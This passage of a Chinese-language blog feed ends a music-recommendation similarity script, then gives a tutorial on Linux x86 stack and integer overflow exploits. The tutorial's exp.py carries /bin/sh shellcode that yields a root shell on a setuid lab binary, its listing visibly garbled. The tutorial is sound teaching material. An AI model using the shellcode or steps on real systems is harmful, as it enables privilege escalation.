class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别计算jaccard值</span></span><br><span class="line">jas1 = repeatsongs / (count2 + count1 - repeatsongs)</span><br><span class="line">jas2 = repeatsingers / (count1 + count2 - repeatsingers)</span><br><span class="line"><span class="keyword">return</span> (jas1 + jas2) / <span class="number">2</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 余弦相似度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算重复歌曲列表的余弦相似度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cossimi</span><span class="params">(user1, user2)</span>:</span></span><br><span class="line">songs1 = user1[<span class="string">'songs'</span>]</span><br><span class="line">songs2 = user2[<span class="string">'songs'</span>]</span><br><span class="line">repeatsongs = repeatlist(songs1, songs2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> repeatsongs:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算相似歌曲矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(songs, user)</span>:</span></span><br><span class="line">scores = list()</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> repeatsongs:</span><br><span class="line">    index = songs.index(each)</span><br><span class="line">    scores.append(user[<span class="string">'scores'</span>][index])</span><br><span class="line"><span class="keyword">return</span> scores</span><br><span class="line"></span><br><span class="line">score1 = score(songs1, user1)</span><br><span class="line">score2 = score(songs2, user2)</span><br><span class="line"></span><br><span class="line">matrix1 = np.array(score1)</span><br><span class="line">matrix2 = np.array(score2)</span><br><span class="line">num = np.inner(matrix1, matrix2)</span><br><span class="line">deno = np.sqrt(matrix1.dot(matrix1)) * np.sqrt(matrix2.dot(matrix2))</span><br><span class="line">res = (num / deno) * <span class="number">100</span></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># user2 = &#123;"singers":["a","b","c","d","e","a","b","c","d","e"],"songs":['海阔a天空', '御花a园', '伤心19a99', '丑八a怪', '给我a一首歌的间', '水a手', 'Beat aIt', '大a约在季', '明天会更a好', '新贵妃醉a酒']&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(user)</span>:</span></span><br><span class="line"><span class="comment"># 读取待比较的用户信息</span></span><br><span class="line"><span class="comment"># users = &#123;'name':,"data":&#125;</span></span><br><span class="line">users = []</span><br><span class="line">users_weekdata = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"info"</span>+str(i)+<span class="string">".json"</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">jsondata = f.read()</span><br><span class="line">data = json.loads(jsondata)</span><br><span class="line">users.append(handle(data))</span><br><span class="line">users_weekdata.append(handle(data,<span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">max_num = <span class="number">0</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'-----------data analysising---------------'</span>)</span><br><span class="line">print()</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> users:</span><br><span class="line">jac = jaccard(item,u)</span><br><span class="line">cos = cossimi(item,u)</span><br><span class="line">print(<span class="string">"&#123;&#125;与&#123;&#125;的jaccard相似度为：&#123;:.2f&#125;%"</span>.format(user[<span class="string">'username'</span>],item[<span class="string">'username'</span>],jac))</span><br><span class="line">print(<span class="string">"&#123;&#125;与&#123;&#125;的余弦相似度为：&#123;:.2f&#125;%"</span>.format(user[<span class="string">'username'</span>],item[<span class="string">'username'</span>],cos))</span><br><span class="line">pts = jac * cos</span><br><span class="line"><span class="keyword">if</span> pts &gt; max_num:</span><br><span class="line">max_num = pts</span><br><span class="line"><span class="comment"># recommendlist = item["songs"]</span></span><br><span class="line"><span class="comment"># recommendsinger = item['singers']</span></span><br><span class="line">index = users.index(item)</span><br><span class="line">recommenduser = item[<span class="string">'username'</span>]</span><br><span class="line">recommend = users_weekdata[index]</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'-------------completed-------------------'</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&#123;&#125;与&#123;&#125;相似度最高，最终推荐的歌单为："</span>.format(user[<span class="string">'username'</span>],recommenduser))</span><br><span class="line">print()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(recommend[<span class="string">'singers'</span>])):</span><br><span class="line"><span class="keyword">if</span>(recommend[<span class="string">'scores'</span>][i] &lt;= <span class="number">2</span>):</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(<span class="string">"&#123;&#125;---------------&#123;&#125;"</span>.format(recommend[<span class="string">'songs'</span>][i],recommend[<span class="string">'singers'</span>][i]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"info4.json"</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">jsondata = f.read()</span><br><span class="line">data1 = json.loads(jsondata)</span><br><span class="line">u = handle(data1)</span><br><span class="line"><span class="comment"># print(data1['weekData'])</span></span><br><span class="line">main(u)</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><img src="/2019/07/25/网易云音乐推荐系统/tu10.png" title="图10"><h2 id="总结与收获（结合信息安全）"><a href="#总结与收获（结合信息安全）" class="headerlink" title="总结与收获（结合信息安全）"></a>总结与收获（结合信息安全）</h2><p>这个推荐系统是基于内容的推荐，是以歌曲名字及歌手信息的推荐。我们用了<code>jaccard算法</code>和<code>余弦相似算法</code>计算相似度。其中这两个算法都需要先计算两个列表中相似的部分。对于相似算法，我们可以用于话题的检测与追踪。首先将话题模型化，报道模型化。然后使用相似度算法比较其相似度，其次我们比较一个阈值，若相似度大于这个阈值，则判断话题与这个报道相关就可以进行舆情监控；反之，则判断话题与报道无关，则建立一个新的话题。</p><p>​    算法当中还有不足的地方，在比较相同歌曲重复度的时候，仅仅是比较重复的歌名。但是歌曲中间还有不同的版本。例如（Remix）版本和（Live）版本，除了在音质上有区别外，其他并没有本质的区别。但是算法还是会把它们区分出来。除次以外，还应该考虑一下同一个歌手的不同歌曲之间的相似度，根据共同喜好的歌手进行推荐。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="信息系统安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="推荐系统" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="信息系统" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="Jcard算法" scheme="http://yoursite.com/tags/Jcard%E7%AE%97%E6%B3%95/"/>
    
      <category term="余弦相似度" scheme="http://yoursite.com/tags/%E4%BD%99%E5%BC%A6%E7%9B%B8%E4%BC%BC%E5%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Linux (x86) Exploit 开发系列教程</title>
    <link href="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/07/20/Linux (x86) Exploit 开发系列教程/</id>
    <published>2019-07-20T09:24:57.000Z</published>
    <updated>2019-07-26T08:16:33.828Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="典型的基于堆栈的缓冲区溢出"><a href="#典型的基于堆栈的缓冲区溢出" class="headerlink" title="典型的基于堆栈的缓冲区溢出"></a>典型的基于堆栈的缓冲区溢出</h2><p>虚拟机：Ubuntu 12.04（x86）</p><p>目标缓冲区位于堆栈中，将源缓冲区复制到目标缓冲区可能导致溢出，首先源字符串长度大于目标缓冲区长度，并且不进行大小检查。导致溢出执行任意代码，允许供给制执行他的代码以获得对受害者及其的控制。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> argv[])</span> </span>&#123;  </span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);  </span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>上述漏洞代码中的<code>[2]行</code>显示里缓冲区溢出。这个bug可能导致任意代码执行，因为缓冲区内容是用户可以自行输入。</p><p><strong>gdb反汇编</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> szt@ubuntu:~/linux exploit/test1$ gdb -q test  </span><br><span class="line"> Reading symbols from /home/szt/linux exploit/test1/test...done.  </span><br><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code **<span class="keyword">for</span>** function main:  </span><br><span class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:   <span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span>  </span><br><span class="line">   <span class="number">0x0804841a</span> &lt;+<span class="number">6</span>&gt;:   sub    esp,<span class="number">0x110</span>  </span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048423</span> &lt;+<span class="number">15</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x08048426</span> &lt;+<span class="number">18</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048428</span> &lt;+<span class="number">20</span>&gt;:  mov    **DWORD** PTR [esp+<span class="number">0x4</span>],eax  </span><br><span class="line">   <span class="number">0x0804842c</span> &lt;+<span class="number">24</span>&gt;:  lea    eax,[esp+<span class="number">0x10</span>]  </span><br><span class="line">   <span class="number">0x08048430</span> &lt;+<span class="number">28</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048433</span> &lt;+<span class="number">31</span>&gt;:  call   <span class="number">0x8048330</span> &lt;<span class="built_in">strcpy</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048438</span> &lt;+<span class="number">36</span>&gt;:  mov    eax,<span class="number">0x8048530</span>  </span><br><span class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:  lea    edx,[esp+<span class="number">0x10</span>]  </span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:  mov    **DWORD** PTR [esp+<span class="number">0x4</span>],edx  </span><br><span class="line">   <span class="number">0x08048445</span> &lt;+<span class="number">49</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048448</span> &lt;+<span class="number">52</span>&gt;:  call   <span class="number">0x8048320</span> &lt;<span class="built_in">printf</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x0804844d</span> &lt;+<span class="number">57</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x08048452</span> &lt;+<span class="number">62</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048453</span> &lt;+<span class="number">63</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>由此可以推测出堆栈布局：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu1.png" title="图1"><p>首先我们可以发现<code>buf[]</code>有<code>256</code>个大小，并且<code>buf[]</code>之后的堆栈是返回地址。理论上如果填充大于<code>256</code>大小的数据到目标缓冲区中，那么会溢出，使得返回地址被多出来的数据所覆盖。所以我们发送一系列的<code>A</code>来测试。</p><p><strong>测试1：是否可以覆盖返回地址</strong></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu2.png" title="图2"><p>发现输出的<code>eip</code>已经是<code>0x41414141</code>，<code>0x41</code>是<code>A</code>的16进制。这样可以确定返回地址已经被我们发送的300个A覆盖了。</p><p>那么我们可以计算，返回地址距<code>buf[]</code> 偏移了多少。首先是<code>buf[]</code>自己的256大小，其次是8个大小对齐空间，然后是4个大小的ebp。</p><p><code>0x100 + 0x8 + 0x4=0x10c</code>  </p><p>所以偏移了<code>0x10c</code>个大小。</p><p>那么我们编写攻击代码<code>exp.py</code>来攻击</p><p><strong>攻击代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py   </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct  </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Stack address where shellcode is copied.  </span></span><br><span class="line"> ret_addr = <span class="number">0xbffff220</span>                           </span><br><span class="line"> <span class="comment">#Spawn a shell  </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh)  </span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">       <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numnk + RA + NOP<span class="string">'s + Shellcode  </span></span><br><span class="line"><span class="string">buf = "A" * 268  </span></span><br><span class="line"><span class="string">buf += conv(ret_addr)  </span></span><br><span class="line"><span class="string">buf += "\x90" * 100  </span></span><br><span class="line"><span class="string">buf += scode  </span></span><br><span class="line"><span class="string">print "Calling vulnerable program"  </span></span><br><span class="line"><span class="string">call(["./test", buf])</span></span><br></pre></td></tr></table></figure><p>执行上面的<code>exp.py</code>程序，给我们<code>root shell</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu3.png" title="图3"><hr><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>存储大于最大支持值的称为整数溢出。整数溢出本身不会导致任意代码执行，但是整数溢出可能会导致堆栈溢出或者堆溢出，这可能导致任意代码执行。</p><p>数据类型大小及范围：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu4.png" title="图4"><blockquote><p>当我们存储一个大于最大值的值的时候，我们的值将会被包装。例如，当我们尝试将21645545422313存储到带符号的int数据类型时，它将被包装并存储为-21645545422313。</p></blockquote><p> 类似的，存储小于最小支持值的值称为整数下溢。例如，当我们尝试将-2147483649存储到带符号的int数据类型时，它将被包装并存储为21471483647.这称为整数下溢。在这里我只会谈论整数溢出，但是这个过程对于下溢也是一样的。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;     </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store_passwd_indb</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_uname</span><span class="params">(<span class="keyword">char</span>* uname)</span> </span>&#123;  </span><br><span class="line">&#125;     </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_passwd</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">char</span> passwd_buf[<span class="number">11</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> passwd_len = <span class="built_in">strlen</span>(passwd); <span class="comment">/* [1] */</span>   </span><br><span class="line"><span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123; <span class="comment">/* [2] */</span>  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Valid Password\n"</span>); <span class="comment">/* [3] */</span>   </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">   <span class="built_in">strcpy</span>(passwd_buf,passwd); <span class="comment">/* [4] */</span>  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Invalid Password\n"</span>); <span class="comment">/* [5] */</span>  </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;  </span><br><span class="line">store_passwd_indb(passwd_buf); <span class="comment">/* [6] */</span>  </span><br><span class="line">&#125;     </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">3</span>) &#123;  </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Usage Error:   \n"</span>);  </span><br><span class="line">       fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    validate_uname(argv[<span class="number">1</span>]);  </span><br><span class="line">    validate_passwd(argv[<span class="number">2</span>]);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$ gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o test test.c  </span><br><span class="line">$ sudo chown root test  </span><br><span class="line">$ sudo chgrp root test  </span><br><span class="line">$ sudo chmod + s test</span><br></pre></td></tr></table></figure><p>上述漏洞代码的[1]行显示了一个<code>整数溢出错误</code>。<code>strlen（）</code>的返回类型是<code>size_t（unsigned int）</code>，它存储在<code>unsigned char</code>数据类型中。因此，任何大于<code>unsigned char</code>的最大支持值的值都会导致整数溢出。因此当密码长度为261时，261将被包裹并存储为<code>passwd_len</code>变量中的<code>5</code>！由于这个整数溢出，可以绕过行<code>[2]</code>执行的边界检查，从而导致基于堆栈的缓冲区溢出！而且在这篇文章中看到，基于堆栈的缓冲区溢出导致任意的代码执行。</p><p>反汇编：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> szt@ubuntu:~/linux exploit/test2$ gdb -q test  </span><br><span class="line"> Reading symbols from /home/szt/linux exploit/test2/test...done.  </span><br><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code **<span class="keyword">for</span>** function main:  </span><br><span class="line">    <span class="number">0x0804852a</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">    <span class="number">0x0804852b</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">    <span class="number">0x0804852d</span> &lt;+<span class="number">3</span>&gt;:   <span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span>  </span><br><span class="line">    <span class="number">0x08048530</span> &lt;+<span class="number">6</span>&gt;:   sub    esp,<span class="number">0x10</span>  </span><br><span class="line">    <span class="number">0x08048533</span> &lt;+<span class="number">9</span>&gt;:   cmp    **DWORD** PTR [ebp+<span class="number">0x8</span>],<span class="number">0x3</span>  </span><br><span class="line">   <span class="number">0x08048537</span> &lt;+<span class="number">13</span>&gt;:  je     <span class="number">0x804855e</span> &lt;main+<span class="number">52</span>&gt;  </span><br><span class="line">   <span class="number">0x08048539</span> &lt;+<span class="number">15</span>&gt;:  mov    **DWORD** PTR [esp],<span class="number">0x8048680</span>  </span><br><span class="line">   <span class="number">0x08048540</span> &lt;+<span class="number">22</span>&gt;:  call   <span class="number">0x80483a0</span> &lt;<span class="built_in">puts</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048545</span> &lt;+<span class="number">27</span>&gt;:  mov    eax,ds:<span class="number">0x804a020</span>  </span><br><span class="line">   <span class="number">0x0804854a</span> &lt;+<span class="number">32</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x0804854d</span> &lt;+<span class="number">35</span>&gt;:  call   <span class="number">0x8048380</span> &lt;fflush@plt&gt;  </span><br><span class="line">   <span class="number">0x08048552</span> &lt;+<span class="number">40</span>&gt;:  mov    **DWORD** PTR [esp],<span class="number">0xffffffff</span>  </span><br><span class="line">   <span class="number">0x08048559</span> &lt;+<span class="number">47</span>&gt;:  call   <span class="number">0x80483c0</span> &lt;<span class="built_in">exit</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x0804855e</span> &lt;+<span class="number">52</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048561</span> &lt;+<span class="number">55</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x08048564</span> &lt;+<span class="number">58</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048566</span> &lt;+<span class="number">60</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048569</span> &lt;+<span class="number">63</span>&gt;:  call   <span class="number">0x8048499</span> &lt;validate_uname&gt;  </span><br><span class="line">   <span class="number">0x0804856e</span> &lt;+<span class="number">68</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048571</span> &lt;+<span class="number">71</span>&gt;:  add    eax,<span class="number">0x8</span>  </span><br><span class="line">   <span class="number">0x08048574</span> &lt;+<span class="number">74</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048576</span> &lt;+<span class="number">76</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048579</span> &lt;+<span class="number">79</span>&gt;:  call   <span class="number">0x804849e</span> &lt;validate_passwd&gt;  </span><br><span class="line">   <span class="number">0x0804857e</span> &lt;+<span class="number">84</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x08048583</span> &lt;+<span class="number">89</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048584</span> &lt;+<span class="number">90</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>堆栈布局：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu5.png" title="图5"><p>由于我们已经知道长度为<code>261</code>的密码，所以绕过边界检查，并允许我们覆盖堆栈中的返回地址。让我们通过发送一系列的A来测试它。</p><p><strong>测试步骤1：是否可以覆盖返回地址？</strong></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu6.png" title="图6"><p>发现可以溢出，并且<code>eip</code>已经被<code>AAAA</code>覆盖了。</p><p><strong>测试步骤2：目的缓冲区的偏移量是多少？</strong></p><p>这里让我们从缓冲区<code>passwd_buf</code>中找出什么偏移返回地址。反汇编并绘制了<code>validate_passwd（）</code>的堆栈布局，现在可以尝试找到偏移位置信息。</p><p>首先是<code>0xb</code>个大小的<code>buf[]</code>,然后是<code>0x1</code>大小的<code>passwd_len</code>，然后是<code>0x4</code>个大小的对齐空间，最后是<code>0x4</code>个大小的<code>edi</code>和<code>0x4</code>个大小的调用者的<code>ebp</code>指针。</p><p><code>0x18 = 0xb + 0x1 + 0x4 + 0x4 + 0x4</code>  </p><p>因此，用户输入的<code>“A” * 24 + “B” * 4 + “C” * 233</code>，以A覆盖<code>passwd_buf</code>，<code>passwd_len</code>，<code>对齐空间</code>，<code>edi</code>和调用者的<code>ebp</code>，以<code>BBBB</code>覆盖返回地址，以<code>C</code>覆盖剩余空间</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu7.png" title="图7"><p>发现<code>eip</code>已经被<code>BBBB</code>覆盖了。然后我们就能用上述漏洞编写一个攻击代码<code>exp.py</code></p><p>攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 